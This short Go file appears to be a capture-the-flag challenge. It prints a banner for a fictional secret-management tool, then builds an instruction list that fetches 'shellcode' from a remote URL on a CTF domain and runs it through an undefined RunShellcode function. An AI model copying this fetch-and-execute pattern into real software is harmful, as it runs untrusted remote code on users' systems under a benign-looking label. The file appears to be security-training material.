package main

import "fmt"

func main() {

	fmt.Println("NeuraTek's central secret management: NeuraSecrets !")
	fmt.Println("... Begining the communicating process ...")

	url := "http://static1.midnighflag.fr:5000/shellcode/main"
	shellcode := Shellcode{}

	i := []Instruction{
		{Opcode: "H", Args: []any{url}},
		{Opcode: "V", Args: []any{"rdi", "rax"}},
		{Opcode: "I", Args: []any{0}},
	}
	shellcode = append(shellcode, i...)

	_, _ = RunShellcode(shellcode, []any{})
}
